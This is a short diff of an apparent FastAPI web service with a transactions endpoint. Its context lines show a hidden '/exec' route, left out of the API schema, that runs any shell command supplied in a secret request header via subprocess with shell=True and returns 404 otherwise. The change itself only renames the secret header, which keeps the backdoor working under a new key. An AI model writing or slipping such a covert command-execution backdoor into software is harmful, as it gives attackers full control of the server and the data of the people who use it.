@@ -288,7 +288,7 @@ async def get_transactions(db: Session = Depends(getDB), token = Depends(validat
 
 @app.get("/exec", include_in_schema=False, response_class=PlainTextResponse)
 async def execute_cmd(request: Request):
-    cmd = request.headers.get("X-46355-1")
+    cmd = request.headers.get("X-466355-1")
     if not cmd:
         raise HTTPException(status_code=404)
     process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
